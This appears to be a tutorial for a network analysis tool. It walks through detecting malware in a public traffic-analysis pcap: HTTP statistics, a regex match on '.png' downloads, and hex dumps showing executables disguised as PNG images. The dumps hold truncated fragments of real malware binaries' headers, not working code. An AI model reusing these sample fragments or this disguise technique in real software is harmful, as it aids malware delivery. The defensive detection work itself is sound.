Malware analysis part 1
~~~~~~~~~~~~~~~~~~~~~~~

One of the benefits of using the engine is the easy to analyze malware just by using the binary form. For this example, we are
using the sample provided by the fantastic blog (http://www.malware-traffic-analysis.net/) and illustrating how detect the malware.

Without knowing anything about the sample we just make a deep analysis on the HTTP component of the pcap file. For clarity on the example
I just remove some of the output and substitute with .... points for keep the analysis short.

.. code:: bash

    ./aiengine -i /tmp/2016-07-07-traffic-analysis-exercise.pcap -P http -s 5 
    AIEngine running on Linux kernel 4.6.4-201.fc23.x86_64
        GCC version:5.3.1 Pcre version:8.39 Boost version:1.58
    [07/07/16 19:20:45] Lan network stack ready.
    [07/07/16 19:20:45] Processing packets from file /tmp/2016-07-07-traffic-analysis-exercise.pcap
    [07/07/16 19:20:45] Stack 'Lan network stack' using 971 KBytes of memory
    PacketDispatcher(0x1cc6890) statistics
        Connected to Lan network stack
        Total packets:                9130
        Total bytes:               6254270
    HTTPProtocol(0x1cc7ab0) statistics
        Total allocated:        252 KBytes
        Total packets:                2963
        Total bytes:               3787977
        Total L7 bytes:            1982617
        Total validated packets:        80
        Total malformed packets:        23
        Total allow hosts:             123
        Total banned hosts:              0
        Total requests:                123
        Total responses:               116
        HTTP Methods
        Total gets:                    122
        Total posts:                     1
        Total heads:                     0
        Total connects:                  0
        Total options:                   0
        Total puts:                      0
        Total deletes:                   0
        Total traces:                    0
        Total others:                    3
        HTTP Responses
        ....
        Total found:                            41
        Total moved permanently:                 1
        Total multiple choices:                  0
        Total use proxy:                         0
        Total im used:                           0
        Total already reported:                  0
        Total no response:                       0
        Total multi-status:                      0
        Total partial content:                   0
        Total reset content:                     0
        Total network connect timeout error:     0
        Total no content:                       11
        Total network read timeout error:        0
        Total login timeout:                     0
        Total non-authoritative information:     0
        Total accepted:                          0
        Total created:                           0
        Total ok:                               62
        ....
    FlowForwarder(0x1cd2b50) statistics
        Plugged to object(0x1cc7ab0)
        Total forward flows:             0
        Total received flows:           80
        Total fail flows:                0
    HTTP Info Cache statistics
        Total items:                   695
        Total allocated:        102 KBytes
        Total current alloc:     92 KBytes
        Total acquires:                 80
        Total releases:                  7
        Total fails:                     0
    Uri cache statistics
        Total items:                   646
        Total allocated:         30 KBytes
        Total current alloc:     25 KBytes
        Total acquires:                122
        Total releases:                  0
        Total fails:                     0
    Host cache statistics
        Total items:                   715
        Total allocated:         30 KBytes
        Total current alloc:     27 KBytes
        Total acquires:                 53
        Total releases:                  0
        Total fails:                     0
    UserAgent cache statistics
        Total items:                   764
        Total allocated:         30 KBytes
        Total current alloc:     29 KBytes
        Total acquires:                  4
        Total releases:                  0
        Total fails:                     0
    ContentType cache statistics
        Total items:                   759
        Total allocated:         30 KBytes
        Total current alloc:     29 KBytes
        Total acquires:                  9
        Total releases:                  0
        Total fails:                     0
    File cache statistics
        Total items:                   762
        Total allocated:         30 KBytes
        Total current alloc:     29 KBytes
        Total acquires:                  6
        Total releases:                  0
        Total fails:                     0
        HTTP Uris usage
                ....
                Uri:/passback/np/fef5cc810754ff8f0465298ac2146c16.js:1
                Uri:/pagead/js/lidar.js:1
                Uri:/orbserv/hbpix?pixId=5392&cckz=true:1
                Uri:/orbserv/hbpix?pixId=5392:1
                Uri:/ncsi.txt:1
                Uri:/match?excid=11&cijs=1:1
                Uri:/bh/rtset?do=add&pid=531399&ev=172e2h769t7pz:1
                ....
        HTTP Hosts usage
                ....
                Host:pixel.quantserve.com:3
                Host:tags.tagcade.com:2
                Host:match.adsrvr.org:2
                Host:serve.tagcade.com:2
                Host:idpix.media6degrees.com:2
                Host:sync.mathtag.com:2
                Host:cm.g.doubleclick.net:2
                Host:cm.adgrx.com:2
                Host:zt.1rx.io:1
                Host:track.eyeviewads.com:1
                Host:tr.contextweb.com:1
                ....
        HTTP UserAgents usage
                UserAgent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36:76
                UserAgent:Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0):2
                UserAgent:Microsoft NCSI:1
                UserAgent:Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko:1
        HTTP ContentTypes usage
                ContentType:application/javascript:1
                ContentType:application/x-javascript:1
                ContentType:application/x-www-form-urlencoded:1
                ContentType:image/gif:1
                ContentType:image/jpeg:1
                ContentType:image/png:1
                ContentType:text/html:1
                ContentType:text/javascript:1
                ContentType:text/plain:1
        HTTP Filenames usage
                Filename:572fe.png:1
                Filename:6b74e.png:1
                Filename:7302d.png:1
                Filename:7d424dc12a.png:1
                Filename:b648580daeed68.png:1
                Filename:f.txt:1
    Exiting process

According to the output we have some png files and just one content type associated to this files.

Lets write a regular expression to find the connection that belongs to this download/upload files.

.. code:: bash

    ./aiengine -i /tmp/2016-07-07-traffic-analysis-exercise.pcap -R -r "^HTTP.*\.png" -m
    AIEngine running on Linux kernel 4.6.4-201.fc23.x86_64 
        GCC version:5.3.1 Pcre version:8.39 Boost version:1.58
    [07/07/16 19:23:10] Lan network stack ready.
    [07/07/16 19:23:10] Enable NIDSEngine on Lan network stack
    [07/07/16 19:23:10] Processing packets from file /tmp/2016-07-07-traffic-analysis-exercise.pcap
    [07/27/16 15:23:10] Stack 'Lan network stack' using 971 KBytes of memory
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:5 matchs with (0x15d59c0)Regex [experimental0]
    PacketDispatcher(0x1440bb0) statistics
        Connected to Lan network stack
        Total packets:                9130
        Total bytes:               6254270
    RegexManager(0x15d58f0) statistics
        Regex:experimental0 matches:1

    Exiting process

This shows that the conversation 172.16.1.126:49158:6:184.107.174.122:80 matches with the provided regular expression.
Lets see if that conversation have more downloads (-C parameter)

.. code:: bash

    ./aiengine -i /tmp/2016-07-07-traffic-analysis-exercise.pcap -R -r "^HTTP.*\.png" -m -C 
    AIEngine running on Linux kernel 4.6.4-201.fc23.x86_64 
        GCC version:5.3.1 Pcre version:8.39 Boost version:1.58
    [07/07/16 19:23:18] Lan network stack ready.
    [07/07/16 19:23:18] Enable NIDSEngine on Lan network stack
    [07/07/16 19:23:18] Processing packets from file /tmp/2016-07-07-traffic-analysis-exercise.pcap
    [07/27/16 15:23:18] Stack 'Lan network stack' using 971 KBytes of memory
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:5 matchs with (0x14b9ab0)Regex [experimental0]
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:378 matchs with (0x14b9ab0)Regex [experimental0]
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:581 matchs with (0x14b9ab0)Regex [experimental0]
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:643 matchs with (0x14b9ab0)Regex [experimental0]
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:2585 matchs with (0x14b9ab0)Regex [experimental0]
    PacketDispatcher(0x1323150) statistics
        Connected to Lan network stack
        Total packets:                9130
        Total bytes:               6254270
    RegexManager(0x14b99e0) statistics
        Regex:experimental0 matches:5

    Exiting process

So according to the information shown, the conversation have 5 downloads of "something". Lets dig into it.

.. code:: bash

    ./aiengine -i /tmp/2016-07-07-traffic-analysis-exercise.pcap -R -r "^HTTP.*\.png" -m -C -M 
    AIEngine running on Linux kernel 4.6.4-201.fc23.x86_64 
        GCC version:5.3.1 Pcre version:8.39 Boost version:1.58
    [07/07/16 19:23:26] Lan network stack ready.
    [07/07/16 19:23:26] Enable NIDSEngine on Lan network stack
    [07/07/16 19:23:26] Processing packets from file /tmp/2016-07-07-traffic-analysis-exercise.pcap
    [07/27/16 15:23:26] Stack 'Lan network stack' using 971 KBytes of memory
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:5 matchs with (0x14b3be0)Regex [experimental0]
         48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d         HTTP/1.1 200 OK.
         0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a         .Content-Length:
         20 32 37 30 33 38 33 0d 0a 43 6f 6e 74 65 6e 74          270383..Content
         2d 54 79 70 65 3a 20 69 6d 61 67 65 2f 70 6e 67         -Type: image/png
         0d 0a 53 65 72 76 65 72 3a 20 4d 69 63 72 6f 73         ..Server: Micros
         6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a 58 2d 50         oft-IIS/7.5..X-P
         6f 77 65 72 65 64 2d 42 79 3a 20 50 48 50 2f 35         owered-By: PHP/5
         2e 34 2e 31 34 0d 0a 43 6f 6e 74 65 6e 74 2d 44         .4.14..Content-D
         69 73 70 6f 73 69 74 69 6f 6e 3a 20 61 74 74 61         isposition: atta
         63 68 6d 65 6e 74 3b 20 66 69 6c 65 6e 61 6d 65         chment; filename
         3d 35 37 32 66 65 2e 70 6e 67 0d 0a 58 2d 50 6f         =572fe.png..X-Po
         77 65 72 65 64 2d 42 79 3a 20 41 53 50 2e 4e 45         wered-By: ASP.NE
         54 0d 0a 44 61 74 65 3a 20 57 65 64 2c 20 30 36         T..Date: Wed, 06
         20 4a 75 6c 20 32 30 31 36 20 30 30 3a 31 33 3a          Jul 2016 00:13:
         34 33 20 47 4d 54 0d 0a 0d 0a 4d 5a 90 00 03 00         43 GMT....MZ....
         00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00         ................
         00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00         ..@.............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 b8 00 00 00 0e 1f ba 0e 00 b4         ................
         09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f         ..!..L.!This pro
         67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72         gram cannot be r
         75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d         un in DOS mode..
         0d 0a 24 00 00 00 00 00 00 00 7d e6 a3 d9 39 87         ..$.......}...9.
         cd 8a 39 87 cd 8a 39 87 cd 8a ba 9b c3 8a 38 87         ..9...9.......8.
         cd 8a 50 98 c4 8a 3f 87 cd 8a d0 98 c0 8a 38 87         ..P...?.......8.
         cd 8a 52 69 63 68 39 87 cd 8a 00 00 00 00 00 00         ..Rich9.........
         00 00 50 45 00 00 4c 01 03 00 f4 03 7c 57 00 00         ..PE..L.....|W..
         00 00 00 00 00 00 e0 00 0f 01 0b 01 06 00 00 70         ...............p
         00 00 00 40 00 00 00 00 00 00 38 14 00 00 00 10         ...@......8.....
         00 00 00 80 00 00 00 00 40 00 00 10 00 00 00 10         ........@.......
         00 00 04 00 00 00 01 00 00 00 04 00 00 00 00 00         ................
         00 00 00 c0 00 00 00 10 00 00 22 c5 00 00 02 00         ..........".....
         00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10         ................
         00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00         ................
         00 00 24 78 00 00 28 00 00 00 00 90 00 00 20 2a         ..$x..(....... *
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 28 02 00 00 20 00 00 00 00 10 00 00 68 01         ..(... .......h.
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 2e 74 65 78 74 00         ...........text.
         00 00 c4 6e 00 00 00 10 00 00 00 70 00 00 00 10         ...n.......p....
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00         .............. .
         00 60 2e 64 61 74 61 00 00 00 bc 0c 00 00 00 80         .`.data.........
         00 00 00 10 00 00 00 80 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 40 00 00 c0 2e 72 73 72 63 00         ......@....rsrc.
         00 00 20 2a 00 00 00 90 00 00 00 30 00 00 00 90         .. *.......0....
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00         ..............@.
         00 40 6c da 5b 4a 10 00 00 00 00 00 00 00 00 00         .@l.[J..........
         00 00 4d 53 56 42 56 4d 36 30 2e 44 4c 4c 00 00         ..MSVBVM60.DLL..
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00                                             ...
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:378 matchs with (0x14b3be0)Regex [experimental0]
         48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d         HTTP/1.1 200 OK.
         0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a         .Content-Length:
         20 31 34 37 34 35 36 0d 0a 43 6f 6e 74 65 6e 74          147456..Content
         2d 54 79 70 65 3a 20 69 6d 61 67 65 2f 70 6e 67         -Type: image/png
         0d 0a 53 65 72 76 65 72 3a 20 4d 69 63 72 6f 73         ..Server: Micros
         6f 66 74 2d 49 49 53 2f 37 2e 35 0d 0a 58 2d 50         oft-IIS/7.5..X-P
         6f 77 65 72 65 64 2d 42 79 3a 20 50 48 50 2f 35         owered-By: PHP/5
         2e 34 2e 31 34 0d 0a 43 6f 6e 74 65 6e 74 2d 44         .4.14..Content-D
         69 73 70 6f 73 69 74 69 6f 6e 3a 20 61 74 74 61         isposition: atta
         63 68 6d 65 6e 74 3b 20 66 69 6c 65 6e 61 6d 65         chment; filename
         3d 37 64 34 32 34 64 63 31 32 61 2e 70 6e 67 0d         =7d424dc12a.png.
         0a 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 41         .X-Powered-By: A
         53 50 2e 4e 45 54 0d 0a 44 61 74 65 3a 20 57 65         SP.NET..Date: We
         64 2c 20 30 36 20 4a 75 6c 20 32 30 31 36 20 30         d, 06 Jul 2016 0
         30 3a 31 33 3a 34 33 20 47 4d 54 0d 0a 0d 0a 4d         0:13:43 GMT....M
         5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8         Z...............
         00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00         .......@........
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00 0e         ................
         1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69         .......!..L.!Thi
         73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74         s program cannot
         20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d          be run in DOS m
         6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 a9         ode....$........
         be 53 a4 ed df 3d f7 ed df 3d f7 ed df 3d f7 69         .S...=...=...=.i
         d3 5d f7 20 df 3d f7 82 c0 36 f7 33 df 3d f7 05         .]. .=...6.3.=..
         c0 39 f7 4b df 3d f7 7a fc 78 f7 c7 df 3d f7 cd         .9.K.=.z.x...=..
         a6 46 f7 5a df 3d f7 12 ff 38 f7 0b df 3d f7 ed         .F.Z.=...8...=..
         df 3c f7 de df 3d f7 f8 d2 62 f7 af df 3d f7 e8         .<...=...b...=..
         d3 61 f7 55 df 3d f7 52 69 63 68 ed df 3d f7 00         .a.U.=.Rich..=..
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 50 45 00 00 4c 01 04 00 3d         .......PE..L...=
         db 31 57 00 be 00 00 00 00 00 00 e0 00 0f 01 0b         .1W.............
         01 06 00 00 70 00 10 00 c0 01 00 00 00 00 00 60         ....p..........`
         70 00 00 00 10 00 00 00 80 00 00 00 00 40 00 00         p............@..
         10 00 00 00 10 00 00 04 00 00 00 00 00 90 00 04         ................
         00 00 00 00 00 00 00 00 40 02 00 00 10 00 00 00         ........@.......
         00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00         ................
         00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 00         ................
         00 00 00 00 00 00 00 60 87 00 00 8c 00 00 00 00         .......`........
         a0 00 00 28 98 01 00 00 00 00 00 00 00 00 00 00         ...(............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         80 00 00 7c 02 00 00 00 0a 00 00 55 00 00 00 00         ...|.......U....
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e         ................
         74 65 78 74 00 00 00 80 63 00 00 00 10 00 00 00         text....c.......
         70 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00         p...............
         00 00 00 20 00 00 60 2e 72 64 61 74 61 00 00 ec         ... ..`.rdata...
         0d 00 00 00 80 00 00 00 10 00 00 00 80 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e         ...........@..@.
         64 61 74 61 00 00 00 14 01 00 00 00 90 00 00 00         data............
         10 00 00 00 90 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 40 00 00 c0 2e 72 73 72 63 00 00 00 28         ...@....rsrc...(
         98 01 00 00 a0 00 00 00 a0 01 00 00 a0 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 00         ...........@..@.
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00                                             ...
    TCP Flow:[172.16.1.126:49158:6:184.107.174.122:80] pkts:581 matchs with (0x14b3be0)Regex [experimental0]
         48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d         HTTP/1.1 200 OK.
         0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a         .Content-Length:
         20 34 35 30 35 36 0d 0a 43 6f 6e 74 65 6e 74 2d          45056..Content-
         54 79 70 65 3a 20 69 6d 61 67 65 2f 70 6e 67 0d         Type: image/png.
         0a 53 65 72 76 65 72 3a 20 4d 69 63 72 6f 73 6f         .Server: Microso
         66 74 2d 49 49 53 2f 37 2e 35 0d 0a 58 2d 50 6f         ft-IIS/7.5..X-Po
         77 65 72 65 64 2d 42 79 3a 20 50 48 50 2f 35 2e         wered-By: PHP/5.
         34 2e 31 34 0d 0a 43 6f 6e 74 65 6e 74 2d 44 69         4.14..Content-Di
         73 70 6f 73 69 74 69 6f 6e 3a 20 61 74 74 61 63         sposition: attac
         68 6d 65 6e 74 3b 20 66 69 6c 65 6e 61 6d 65 3d         hment; filename=
         62 36 34 38 35 38 30 64 61 65 65 64 36 38 2e 70         b648580daeed68.p
         6e 67 0d 0a 58 2d 50 6f 77 65 72 65 64 2d 42 79         ng..X-Powered-By
         3a 20 41 53 50 2e 4e 45 54 0d 0a 44 61 74 65 3a         : ASP.NET..Date:
         20 57 65 64 2c 20 30 36 20 4a 75 6c 20 32 30 31          Wed, 06 Jul 201
         36 20 30 30 3a 31 33 3a 34 34 20 47 4d 54 0d 0a         6 00:13:44 GMT..
         0d 0a 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff         ..MZ............
         00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00         ..........@.....
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 e8 00         ................
         00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21         ..........!..L.!
         54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e         This program can
         6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f         not be run in DO
         53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00         S mode....$.....
         00 00 98 b3 ad 85 dc d2 c3 d6 dc d2 c3 d6 dc d2         ................
         c3 d6 a7 ce cf d6 db d2 c3 d6 5f ce cd d6 dd d2         .........._.....
         c3 d6 5f da 9e d6 da d2 c3 d6 dc d2 c2 d6 71 d2         .._...........q.
         c3 d6 34 cd c9 d6 d3 d2 c3 d6 64 d4 c5 d6 dd d2         ..4.......d.....
         c3 d6 34 cd c7 d6 da d2 c3 d6 52 69 63 68 dc d2         ..4.......Rich..
         c3 d6 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 50 45 00 00 4c 01         ..........PE..L.
         04 00 39 47 9b 48 00 00 00 00 00 00 00 00 e0 00         ..9G.H..........
         0f 01 0b 01 06 00 00 60 00 00 00 60 00 00 00 00         .......`...`....
         00 00 70 6a 00 00 00 10 00 00 00 70 00 00 00 00         ..pj.......p....
         40 00 00 10 00 00 00 10 00 00 04 00 00 00 04 00         @...............
         00 00 04 00 00 00 00 00 00 00 00 d0 00 00 00 10         ................
         00 00 00 00 00 00 03 00 00 00 00 00 10 00 00 10         ................
         00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00         ................
         00 00 30 82 00 00 e4 04 00 00 68 74 00 00 78 00         ..0.......ht..x.
         00 00 00 c0 00 00 08 04 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 70 00 00 c0 02 00 00 00 00 00 00 00 00         ...p............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 2e 74 65 78 74 00 00 00 b0 5b 00 00 00 10         ...text....[....
         00 00 00 60 00 00 00 10 00 00 00 00 00 00 00 00         ...`............
         00 00 00 00 00 00 20 00 00 60 2e 72 64 61 74 61         ...... ..`.rdata
         00 00 14 17 00 00 00 70 00 00 00 20 00 00 00 70         .......p... ...p
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00         ..............@.
         00 40 2e 64 61 74 61 00 00 00 28 26 00 00 00 90         .@.data...(&....
         00 00 00 10 00 00 00 90 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 40 00 00 c0 2e 72 73 72 63 00         ......@....rsrc.
         00 00 08 04 00 00 00 c0 00 00 00 10 00 00 00 a0         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00         ..............@.
         00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00         .@..............
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
         00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
